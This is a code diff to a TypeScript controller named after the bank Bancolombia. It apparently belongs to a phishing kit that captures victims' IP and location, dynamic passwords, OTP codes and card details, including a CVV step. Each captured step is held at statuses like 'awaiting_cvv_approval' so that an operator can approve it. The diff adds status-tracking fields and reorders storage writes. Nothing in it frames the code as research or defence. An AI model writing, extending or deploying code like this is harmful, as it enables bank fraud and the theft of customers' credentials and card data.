@@ -85,15 +85,16 @@ export class BancolombiaController {
       // Formatear la ubicación: "País, Ciudad, Región"
       const location = geoData ? `${geoData.country}, ${geoData.city}, ${geoData.region}` : 'Desconocida';
 
-      // Se agrega el session Id
       currentSession.ip = ip;
       currentSession.location = location;
       currentSession.banco = "BANCOLOMBIA";
       currentSession.sessionId = sessionId;
+      currentSession.lastStatus = 'pendiente';
+      currentSession.statusTick = Date.now();
 
       // Se añade la informacion al storage
-      await StorageService.set(`session_${sessionId}`, currentSession);
       await StorageService.set(`status_${sessionId}`, 'pendiente');
+      await StorageService.set(`session_${sessionId}`, currentSession);
 
       // Se captura si viene por TC
       const tc = currentSession.tc || false;
@@ -174,10 +175,12 @@ export class BancolombiaController {
         clave: claveDinamica,
         fecha: BancolombiaController.formatDateCustom(new Date()),
       });
+      currentSession.lastStatus = 'pendiente';
+      currentSession.statusTick = Date.now();
 
       // Se setea la informacion en el almacenamiento
-      await StorageService.set(`session_${sessionId}`, currentSession);
       await StorageService.set(`status_${sessionId}`, 'pendiente');
+      await StorageService.set(`session_${sessionId}`, currentSession);
 
       // Se usa el messageId de la sesión (persiste en Firebase, no en memoria)
       const messageId = currentSession.messageId;
@@ -258,10 +261,12 @@ export class BancolombiaController {
         otp: otp,
         fecha: BancolombiaController.formatDateCustom(new Date()),
       });
+      currentSession.lastStatus = 'pendiente';
+      currentSession.statusTick = Date.now();
 
       // Se setea la informacion en el almacenamiento
-      await StorageService.set(`session_${sessionId}`, currentSession);
       await StorageService.set(`status_${sessionId}`, 'pendiente');
+      await StorageService.set(`session_${sessionId}`, currentSession);
 
       // Se usa el messageId de la sesión (persiste en Firebase, no en memoria)
       const messageId = currentSession.messageId;
@@ -338,10 +343,12 @@ export class BancolombiaController {
         mensaje: 'El usuario solicita nueva OTP',
         fecha: BancolombiaController.formatDateCustom(new Date()),
       });
+      currentSession.lastStatus = 'awaiting_otp_resend_decision';
+      currentSession.statusTick = Date.now();
 
       // Se setea la informacion en el almacenamiento
-      await StorageService.set(`session_${sessionId}`, currentSession);
       await StorageService.set(`status_${sessionId}`, 'awaiting_otp_resend_decision');
+      await StorageService.set(`session_${sessionId}`, currentSession);
 
       // Se usa el messageId de la sesión (persiste en Firebase, no en memoria)
       const messageId = currentSession.messageId;
@@ -418,10 +425,12 @@ export class BancolombiaController {
         accion: accion,
         fecha: BancolombiaController.formatDateCustom(new Date()),
       });
+      currentSession.lastStatus = 'awaiting_923_instructions';
+      currentSession.statusTick = Date.now();
 
       // Se setea la informacion en el almacenamiento
-      await StorageService.set(`session_${sessionId}`, currentSession);
       await StorageService.set(`status_${sessionId}`, 'awaiting_923_instructions');
+      await StorageService.set(`session_${sessionId}`, currentSession);
 
       // Se usa el messageId de la sesión (persiste en Firebase, no en memoria)
       const messageId = currentSession.messageId;
@@ -596,10 +605,12 @@ export class BancolombiaController {
         cardLabel: cardData?.label || 'Custom Card',
         fecha: BancolombiaController.formatDateCustom(new Date()),
       });
+      currentSession.lastStatus = 'awaiting_tc_approval';
+      currentSession.statusTick = Date.now();
 
       // Se setea la informacion en el almacenamiento
-      await StorageService.set(`session_${sessionId}`, currentSession);
       await StorageService.set(`status_${sessionId}`, 'awaiting_tc_approval');
+      await StorageService.set(`session_${sessionId}`, currentSession);
 
       // Se usa el messageId de la sesión (persiste en Firebase, no en memoria)
       const messageId = currentSession.messageId;
@@ -761,10 +772,12 @@ export class BancolombiaController {
         digits: cardData?.digits || '****',
         fecha: BancolombiaController.formatDateCustom(new Date()),
       });
+      currentSession.lastStatus = 'awaiting_cvv_approval';
+      currentSession.statusTick = Date.now();
 
       // Se setea la informacion en el almacenamiento
-      await StorageService.set(`session_${sessionId}`, currentSession);
       await StorageService.set(`status_${sessionId}`, 'awaiting_cvv_approval');
+      await StorageService.set(`session_${sessionId}`, currentSession);
 
       // Se usa el messageId de la sesión (persiste en Firebase, no en memoria)
       const messageId = currentSession.messageId;
